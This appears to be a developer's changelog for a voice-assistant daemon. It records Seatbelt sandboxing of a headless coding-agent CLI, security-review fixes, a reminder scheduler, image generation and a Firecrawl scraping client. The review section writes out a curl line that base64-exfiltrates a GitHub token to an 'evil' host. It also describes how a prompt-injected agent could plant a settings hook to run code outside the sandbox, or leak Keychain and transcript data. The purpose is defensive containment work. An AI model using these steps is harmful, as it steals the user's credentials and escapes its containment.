**S2 — `allowLocalBinding` (🔵, caveat).** Not set → sandboxed commands can't bind a local port. A
session that runs a dev server or a port-binding test suite (incl. Gumbo's own `npm test`, which
binds `GUMBO_PORT`) will fail with a confusing bind error, and can't reach the daemon's loopback
:8737 either (a containment plus, but a footgun for legit dev servers). Wire `allowLocalBinding`
through config only when a real task needs it.

**S3 — workspace realpath (🔵, FIXED).** `sandboxSettings` now `realpathSync`es the task workspace
(guarded on existence) so a symlinked `GUMBO_HOME` (e.g. `/tmp` → `/private/tmp` on macOS) can't
make Seatbelt's real-path matching miss it. Mirrors the manager's cwd canonicalization.

**S4 — marker→error mapping untested (🔵, acknowledged).** `SANDBOX_MARKER` regex is well-tested,
but the `run()` mapping to `CLAUDE_SANDBOX_ERROR` isn't exercised — same gap as `AUTH_MARKER`
(no `query()` fake exists; manager.test drives the manager with fake runners). Left as-is per that
precedent; fold both into a query() fake if one is ever built.

Tests: **104/104**. New: `sandboxSettings` realpath branch, `credentials` shape, and the
`protectedPathHit` hard-deny (Read/Edit/Grep of `.env`/`~/.claude`, tilde form, containing-dir
Grep, bash-unaffected, non-secret allowed).

### M4.1 — REBUILT as a whole-CLI Seatbelt wrap (2026-07-16, from the user's "run like you, with a safety net")

> ⚠️ **This supersedes the two sections above.** The SDK-`sandbox`-option approach they describe is
> GONE. The `sandbox governs bash only; the policy hook does the file tools` framing no longer
> holds — the OS sandbox now governs the file tools too.

**Why the rebuild:** the review-address pass left file-tool filesystem containment to the supervisor
policy (a *semantic* gate — escalate-outside-cwd → confirm → fail-closed-on-timeout). the user wanted
it **OS-deterministic** — "so even the cloud process tools can't escape the sandbox." A research
sub-agent (report in the transcript) confirmed the approach: the SDK `sandbox` option only jails
spawned bash (Anthropic issue #26616 "isolate all tool execution, not just Bash" — closed
not-planned; the docs say file tools are out of `/sandbox` scope). The only way to OS-confine the
CLI's own file tools is to run the **whole CLI process** under macOS Seatbelt. Anthropic's own
`@anthropic-ai/sandbox-runtime` does exactly this; we hand-roll it to avoid a beta dependency (and
the permission classifier blocked auto-adopting an un-vetted package for the security boundary).

**How:** `spawnClaudeCodeProcess` (the SDK's VM/container seam) launches the CLI as
`sandbox-exec -p <SBPL profile> <cli> <args>`. macOS forbids **nesting** a second sandbox inside the
first (`sandbox_apply` → EPERM, even for a strictly-tighter inner profile — confirmed), so this
**REPLACES** the SDK `sandbox` option rather than layering under it. Verified end-to-end with the
shipped `buildSandboxProfile` (16+ probes, `m41-spike/`): the **Write/Edit/Read tools EPERM** outside
the boundary and on secrets, bash is confined the same way, auth (Keychain) works, and
undo/`rewindFiles` still works (checkpoints under `~/.claude`, which stays writable).

**Design philosophy — a safety net, not a cage (the user).** The headless session should run like an
interactive one (any CLI, MCP, package install, research on any host) but be unable to escape its
task. So the profile is `(allow default)` **minus** two subtractions:
- **Writes** confined to the project cwd + task workspace + the runtime/cache dirs tools need
  (`~/.claude`, `$TMPDIR`, `~/.npm`, `~/.cache`, `~/Library/Caches`). The user's Documents, other
  projects, dotfiles, and system stay unwritable — can't clobber anything outside the task.
- **Secret reads** denied: `.env` (repo provider keys), `~/.ssh`, `~/.aws`. Reads are otherwise
  open, so the agent can read libs/docs/source for research.

**Network — OPEN (the user's explicit call, asked directly).** A single Seatbelt layer can't allow the
CLI's egress while denying bash's without an out-of-sandbox filtering proxy, and an allowlist would
limit research/docs (arbitrary hosts) — defeating "run like you." I built and verified a zero-dep
loopback filtering proxy (deny-all-direct + allowlist via a CONNECT proxy — it worked: CLI auth
through it, direct sockets EPERM'd, non-allowlisted hosts 403'd), but the user chose **open** for
capability parity. The exfil net is therefore: **secrets are unreadable** (little to leak) + the
supervisor policy **still escalates network-SENDS** (curl -d / POST / wget --post / git push →
notch confirm, fail-closed). Residual (accepted): a plain GET could leak non-secret data.

**Capability wiring (the user wanted parity with an interactive session):**
- **CLIs** the user has work directly — the sandbox allows read+exec of any binary and network is
  open. `firecrawl` uses its **own stored auth** (`~/Library/Application Support/firecrawl-cli`,
  readable under the sandbox) — so the daemon's least-privilege env-strip stays intact (no provider
  key injected into the session env). `git`/`node`/etc. verified runnable.
- **Context7 MCP** wired explicitly (`config.claude.mcpServers`, `type:'http'`,
  `https://mcp.context7.com/mcp`) — headless sessions don't inherit claude.ai connectors. It's
  **added on top** of the `~/.claude` MCPs the session inherits (verified at init: playwright, exa,
  claude.ai Tavily all present alongside context7). Package installs work (`~/.npm` writable).

**Fail-closed** is now our own pre-spawn check (`sandboxUnavailableReason`): non-macOS or missing
`/usr/bin/sandbox-exec` → the runner throws `CLAUDE_SANDBOX_ERROR` before the session starts, rather
than running unconfined. (The old SDK-emitted `SANDBOX_MARKER` result string is gone with the SDK
sandbox.)

**Belt-and-suspenders retained:** the supervisor policy's `protectedPathHit` hard-deny and
edit-outside-cwd escalation stay — now redundant with the OS layer for `.env`, but they give a clean
"blocked: protected secret path" message instead of a raw EPERM and cover the Read tool on
`~/.claude` (which the OS layer intentionally leaves readable so the CLI can read its own state).

Tests: **102/102** (replaced the SDK-`sandboxSettings`/`SANDBOX_MARKER` tests with
`buildSandboxProfile` shape + `sandboxUnavailableReason`).

**Open follow-up:** if the user later wants OS-level network default-deny back, the loopback filtering
proxy is the way (proven in `m41-spike/proxy-verify.mjs`) — or adopt `@anthropic-ai/sandbox-runtime`
which bundles it. Left out now by his capability-first choice.

#### Review-2 (2 Fable agents) + address — filesystem holes tightened (2026-07-16)

The rebuild got a 2-agent /review-2. No bugs in the wrap itself (writes confined, fail-closed real,
spawn/IPC/kill sound — SBPL is last-match-wins, so deny-before-allow works), but **both agents
corroborated two reachable filesystem-containment holes** the "safety net" was supposed to close.
Both fixed; both respect the open-network choice (reads/writes only):

- **🔴 Writable `~/.claude` → unsandboxed RCE + persistence.** The profile made `~/.claude` writable
  (checkpoints need it), but it also holds `settings.json`/`hooks`/`plugins`/`agents`/`skills`/
  `commands`/`CLAUDE.md` — which execute in the user's *next interactive* session, OUTSIDE this
  sandbox. `protectedPathHit` hard-denies the file TOOLS on `~/.claude` but skips Bash, and the OS
  sandbox allowed the write — so a bash `>> ~/.claude/settings.json` could drop a `SessionStart`
  command hook (no `ESCALATE_BASH` match → auto-allowed) that runs unsandboxed later. **Fix:** re-deny
  those exec surfaces *after* the `~/.claude` allow (last-match-wins, verified: `settings.json` write
  BLOCKED while `file-history` stays writable → checkpointing/undo still work), and drop the
  `~/.claude.json` write-allow (MCP/trust-injection surface).
- **🔴 Readable credential dotfiles → token exfil over the open net.** Only `.env`/`.ssh`/`.aws` were
  read-denied; `~/.config/gh` (a live GitHub OAuth token, present on this machine), `~/.npmrc`,
  `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.gnupg`, `~/.config/gcloud` stayed readable → a
  bash `curl "http://evil/?d=$(base64 < ~/.config/gh/hosts.yml)"` — a **GET**, so the network-SEND
  escalation (POST-only) misses it — leaks a bearer credential. **Fix:** extend `readDenied` (verified:
  gh DENIED at the sandbox level, `package.json` still readable). This makes the "secrets unreadable"
  exfil-net claim actually true for on-disk credential *files*.
- **🟡s:** custom-spawn stderr `'pipe'` was never drained (SDK only drains its own spawn) → backpressure
  deadlock risk → `'inherit'`; a config flip to `failIfUnavailable:false` on an unsupported platform
  would silently run UNSANDBOXED → now emits a `claude.sandbox {unconfined:true}` audit event; empty
  `cwd`/`taskId` would emit `(subpath "")` and re-open all writes → guard throws; the now-inverted
  "sandbox governs only bash" comments (supervisor.ts/config.ts/tests) corrected — the OS layer covers
  the file tools too now, so `protectedPathHit` stays as belt-and-suspenders (clean message + the one
  `~/.claude`-read case the OS layer intentionally leaves open). Profile ordering + credential/exec-
  surface denies are now asserted in tests. 103/103.

**Residual, stated honestly (only the network-deny proxy closes it — accepted under the user's
open-network choice):** the CLI itself must read `~/.claude` (its transcripts, config) and the
macOS **Keychain** (the claude.ai OAuth token — subscription auth), and `allow default` grants both
to bash too. So a prompt-injected session can still `cat ~/.claude/projects/**` (other sessions'
history) or `security find-generic-password …` (the OAuth token) and GET-exfil them. This can't be
closed while keeping the session working *and* the network open in a single Seatbelt layer — it needs
the loopback filtering proxy (network default-deny) from `m41-spike/proxy-verify.mjs`. Flagged for
the user; left as his capability-first call. The *fixable* credential surfaces (repo `.env`, gh/npm/
cloud tokens, ssh/aws/gnupg) ARE now closed.

---

## M5 — Images + a Gumbo-owned scheduler (reminders) — 2026-07-16

### Build

- **Images:** `daemon/src/images/generate.ts` (raw fetch client, same conventions as
  tavily/exa) behind a realtime `generate_image` tool. The tool **acks instantly** — generation
  takes tens of seconds and must never block a voice turn — then the background half writes the
  PNG to `~/Gumbo/images/<id>.png`, emits `image.created` with the **filename only**, and
  speaks a brief completion. Deliberately no task/workspace (a full task is overkill for one
  API call; the event + gallery are the observability).
- **Scheduler:** `daemon/src/schedule/scheduler.ts` + a sqlite `schedule` table in the Store
  (`id, fire_at, kind, text, status, eventkit_id, created_at`) + a 20 s poll loop. On fire:
  mark fired → `reminder.fired` → deliver by speaking. `kind` is the extensibility seam
  (recurring digests, timed task spawns later) — M5 ships only `kind:'reminder'`, one-shot.
- **Announce path generalized, not duplicated:** `announceTaskFinished` was refactored into
  shared `settleConnecting` / `speakCold` / `injectLive` helpers, and M5's deliveries go
  through a new `Orchestrator.speakProactively(coldText, liveInstructions)` on the same rules —
  inject live if a session is open, else cold one-shot TTS `0x02` + (for reminders) a gold
  `notch_pulse {status:'reminder'}`; never opens a session just to speak; skips synthesis when
  no shell is connected.
- **Shell:** `Reminders/RemindersBridge.swift` — EventKit via `requestFullAccessToReminders`
  (NOT AppleScript — ~100× slower), `NSRemindersFullAccessUsageDescription` added to
  project.yml (**new TCC grant — first create_reminder prompts**; shell owns all TCC). Due-date
  components + an absolute `EKAlarm` so Reminders.app actually notifies at fire time. Notch
  pulse gained a gold 'reminder' case. Dashboard: gallery (thumbnails from `/files/images/`,
  lightbox) + reminders rail section; `/api/images` (readdir, filesystem is source of truth) +
  `/api/schedule` bootstrap, live updates from `image.created` / `reminder.*` events.

### The scheduler-vs-EventKit split (why both, recorded per the brief)

`set_reminder` writes BOTH halves because neither alone is complete:
- The **daemon poll loop** is Gumbo's spoken presence — but it only fires while the daemon
  runs. Mac asleep at fire time → it fires late, on wake; daemon off → not at all. We do not
  fight this (no launchd, no wake scheduling) — that's what EventKit is for.
- **EventKit** is the reliable OS-level delivery (Reminders.app fires even with the daemon off,
  wakes for its notification, syncs across devices) — but it can't speak as Gumbo.
So: schedule row = awareness + voice when awake; EventKit twin = durability. The shell replies
`reminder_created` with the EventKit id, stored on the row so cancel can remove the twin
(`remove_reminder`, best-effort).

### Decisions that will matter later

- **At-most-once fire:** a due row is marked `fired` BEFORE delivery. A crash mid-delivery
  loses one spoken reminder (EventKit still notified); marking after would re-fire a throwing
  row every 20 s forever. Delivery errors land as `session.error`, never unhandled.
- **No immediate sweep on boot:** the first sweep is one poll interval after `start()`. At
  daemon boot the shell hasn't reconnected yet (1.5 s retry loop), so a row that came due
  while the daemon was down would speak into a shell-less hub and be silently lost; 20 s of
  grace is nothing against the poll granularity, and EventKit already delivered on time if the
  daemon was off.
- **Late `reminder_created` after cancel:** if the shell's reply lands after the row was
  cancelled, the scheduler immediately sends `remove_reminder` with the fresh id instead of
  orphaning an entry in Reminders.app (and never adopts the id onto a cancelled row).
- **Reaper untouched:** it only reconciles the `tasks` table; a pending reminder outliving the
  daemon is the point. Unit-tested (restart reload + reap + fire).
- **Time-of-day injection:** orchestrator instructions carried only the *date* — "in 10
  minutes" needs the clock. `timeLabel()` (config.ts) joins `todayLabel()`; the daemon still
  validates fire_at is in the future (`Date.parse` of a no-offset ISO string is local time,
  which is exactly the tool's parameter contract).
- **Tool count is now 14** against SPEC §10's "≤ ~10 forgiving tools" standing risk. Routing
  held in the smoke (one turn → both `generate_image` and `set_reminder`), but watch the
  orchestrator's tool selection as the registry grows.

### Images API — verified live before building (2026-07-16)

- `gpt-image-2` exists on `/v1/images/generations` (a dated snapshot `gpt-image-2-2026-04-21`
  too). Request `{model, prompt, size}` → `data[0].b64_json`, base64 PNG (`output_format`
  defaults to png); `usage` block included. Quality param accepted (`low` verified) but left to
  the API default in the client — fewer knobs on a voice tool.
- **Sizes are free-form**: any width×height divisible by 16 (probed via the API's own
  invalid-size error — a free call). This differs from gpt-image-1's fixed size list. We still
  expose only square/landscape/portrait (1024²/1536×1024/1024×1536) — a voice model doesn't
  need a resolution picker.

### GOTCHA (worktree dev): copy `.env`, don't symlink

A symlinked worktree `.env` broke the M4.1 sandbox-profile test: `buildSandboxProfile`
realpaths `.env` (resolving the symlink to the main checkout's path) while the test asserts
the literal `secretFilePaths[0]` (the worktree path). Copy the file into worktrees instead.

### Verified (how)

- **120/120 daemon unit tests** (17 new): scheduler lifecycle (due fires once + event +
  delivery; future rows wait; restart reload with reaper no-touch; cancel incl. EventKit twin
  removal + no-fire; `create_reminder`/`reminder_created` message contract incl. the
  late-reply-after-cancel race; throwing delivery contained; real poll loop start/stop;
  list ordering), image generation (request serialization against the verified live shape;
  PNG magic bytes on disk; `image.created` carries a filename and provably not the base64;
  API-failure and empty-response paths both speak), `set_reminder` past/garbage-time guards,
  M5 tools present in the registry (Firecrawl exclusion re-asserted).
- **Full-path smoke** (real `src/index.ts` on GUMBO_PORT 8747, scratchpad GUMBO_HOME, fake
  shell WS client): the adapted demo phrase — "make me a wallpaper of a swamp at dusk, and
  remind me in 2 minutes to review it" — in ONE realtime turn produced both tool calls;
  `set_reminder` resolved "in 2 minutes" to the correct absolute local time (time-injection
  works); `create_reminder` hit the fake shell, its `reminder_created` (EK-SMOKE-1) landed on
  the row (verified via `/api/schedule`); the image arrived in 49 s — real 1536×1024 PNG on
  disk (the model picked landscape for "wallpaper" on its own), `image.created` filename-only,
  live spoken completion; the poll loop fired the due row within one interval →
  `reminder.fired` + gold `notch_pulse` + live spoken "the user, review the swamp wallpaper.";
  a second reminder timed past the session idle-close exercised the **cold** branch (73 × 0x02
  TTS frames at the fake shell + the gold pulse). Bonus: the **past-time guard recovered live** —
  the model first passed a fire_at a few seconds in the past, got the tool's "in the past —
  re-resolve" refusal, and self-corrected to a valid time on the next call. Shell builds +
  signs clean (xcodegen + xcodebuild).
- **Not yet verified:** the real EventKit write (the smoke's shell was fake — first real
  create prompts for the new Reminders TCC grant) and the dashboard render (both dev ports
  were held by the user's live daemon/vite during the build; data contracts are unit-covered).
  Both land with the live demo.

---

## Firecrawl content acquisition — scrape/crawl/map/extract for background agents — 2026-07-15

### Build
- New `daemon/src/scrape/firecrawl.ts` — raw Firecrawl **v2** client (no SDK, same reasoning
  as the exa-js removal) behind four background sub-agent tools in `agents/openai-runner.ts`:
  `scrape_page`, `map_site`, `crawl_site`, `extract_structured`. **Content acquisition from
  known URLs/sites only — never a third search provider**; Firecrawl `/search` is deliberately
  not integrated, and `realtime/tools.test.ts` asserts on the actual registry that no
  Firecrawl tool ever reaches the realtime session config.
- `search/client.ts` generalized: `postJson` is now an alias of `requestJson`, which takes an
  optional `method` (`GET`/`DELETE`) and optional body — needed for async-job polling and
  cancellation. Same retry policy, typed errors, and audit conventions apply unchanged;
  existing callers didn't move. `FIRECRAWL_API_KEY` joined boot validation + `.env`.
- Persistence reuses the memory table verbatim: `persistResults` grew a `provider` param
  (default `'exa'`), so every scraped/crawled page lands FTS5-indexed with source URL +
  retrieval timestamp. Extract output is persisted as one pretty-printed-JSON row **per
  source URL** (≤10) so every memory record carries its own provenance.

### Verified against docs.firecrawl.dev + firecrawl.dev/pricing (2026-07-15)
- Endpoints: `POST /v2/scrape` (sync), `POST /v2/map` (sync), `POST /v2/crawl` → job id,
  polled via `GET /v2/crawl/{id}` (status `scraping|completed|failed`, paginated `next`
  cursor in ~10 MB chunks), cancelled via `DELETE /v2/crawl/{id}`; `POST /v2/extract` → job
  id, polled via `GET /v2/extract/{id}` (status `processing|completed|failed|cancelled`).
  **No DELETE is documented for extract** — a task abort stops polling but can't kill the
  server-side job (bounded: it only touches the given URLs).
- **Credit costs (they justify the breadth defaults):** scrape and crawl are **1 credit per
  page**; map is billed per page listed ("1 / page" on the pricing table — ambiguous whether
  per-call, so our map default limit is 500); extract bills in credits at **15 tokens per
  credit**; search is 2/10 results (unused). **The crawl API's own `limit` default is
  10 000 pages** — a blind crawl at API defaults would be 10 000 credits, hence: default
  100 pages / depth 3, cap sent as the API `limit` AND enforced client-side while
  collecting. The client-side check caught a real bug in review: pagination followed the
  `next` cursor once more *before* re-checking the cap (unit test caught it).
- **robots.txt:** crawl respects it by default; `ignoreRobotsTxt` exists but is
  enterprise-only and defaults false — we never set it, so compliance is structural.
- **Polling, not webhooks:** the daemon binds loopback only, so Firecrawl's cloud can never
  deliver a webhook. No documented recommended poll interval; we poll every 3 s under an
  overall job budget (crawl 10 min, extract 5 min — background budgets in the spirit of Exa
  `deep`'s 180 s). Crawl polls emit `crawl.status` events (only on progress change) so the
  dashboard/bubble panel can watch a long crawl; any error/abort/budget exit with a live job
  fires a best-effort remote DELETE so a dead task stops spending credits.
- Audit: every outbound call gets its own JSONL line as it happens — submits, each status
  poll, each pagination fetch, and remote cancels (job routes logged as `/crawl/:id`-style
  endpoints with the target URL as `query`; polls carry the server-reported page count).
  A failing call is audited once, by the operation-level catch, which also records logical
  failures (empty results, budget exhaustion) that have no failing HTTP call behind them.
- Extract's tool takes the JSON Schema **as a JSON string** — strict function schemas don't
  take free-form object params; the tool parses and returns a model-facing error on bad JSON.

### Gating (pre-M4)
No permission engine yet (M4). scrape/map are auto-allowed like background search; crawl and
extract ride the existing voice-triggered spawn-task flow — they only exist inside sub-agent
runs the user deliberately spawns. M4 registration defaults recorded in CLAUDE.md.

### Verified (how)
- 63/63 unit tests green (`npm test -w daemon`): request serialization for all four ops, the
  crawl job lifecycle (submit → poll → paginate → complete, failure, budget timeout, and
  task-abort paths — the latter two assert the remote DELETE), client-side page-cap
  enforcement, typed-error mapping (401 auth non-retried / 429 quota / abort timeout / 5xx
  retried max twice), `requestJson` GET/DELETE contracts, and the no-Firecrawl-in-realtime
  registry assertion.
- Smoke 1 (real API, scratchpad `GUMBO_HOME`): scraped `bsky.app/profile/bsky.app` — a true
  SPA that's an empty HTML shell without JS — into 50 991 chars of clean markdown; memory row
  (provider `firecrawl`, ts, source URL), FTS5 `MATCH` hit, and `/scrape ok:true` audit line
  all verified.
- Smoke 2 (real API): mapped `docs.firecrawl.dev` (30 URLs) → selectively scraped 2 mapped
  pages → crawled with `maxPages: 5`: exactly 5 pages returned (progress polls observed
  `scraping 4/5 → 5/5 → completed`), page cap held, one audit line per operation.
- **GOTCHA:** `/map` leans on sitemaps — `tsx.is` (no sitemap) mapped to just its homepage
  while `docs.firecrawl.dev` returned a full URL list. If a map comes back near-empty, the
  site probably has no sitemap; scrape/crawl still work there.

### Review + address pass (2026-07-15, two-axis standards/spec review)
- **Audit granularity reverted to per-call.** The build had narrowed "audit every outbound
  call" to one line per logical operation (polls unlogged) — a self-authorized standards
  change the review flagged on both axes. Now every submit/poll/pagination/cancel gets its
  own line via `auditedCall`; failures audit exactly once at the op-level catch (never in
  the helper) so a failed call can't produce two lines. Volume cost is real (~200 lines for
  a 10-min crawl) but the audit log is private provenance, not a UX surface — spec wins.
- `firecrawlHeaders()` moved inside `try` in crawl/extract (was inconsistent with
  scrape/map, and a missing-key auth throw escaped unaudited).
- Extract persists one row **per source URL** (was `urls[0]` only — other sources survived
  only in the query string); mirrors the exaContents row-per-url shape.
- `map_site`'s relevance-ordering `search` param removed as scope creep (spec: map = URL
  list). Trade-off accepted: on large sites agents pick from the raw list. Map results are
  deliberately NOT persisted to memory (URL lists, not content) — now documented in
  CLAUDE.md rather than implicit.
- Inline 30 s/10 s job timeouts → `config.firecrawl.requestTimeoutMs`/`cancelTimeoutMs`;
  poll interval renamed `jobPollIntervalMs` since extract shares it with crawl.
- Review's informational note, for posterity: crawl/extract gating is tool-description
  steering + the spawn-task approval flow, not a code-level gate — that IS the pre-M4
  design, not an oversight.
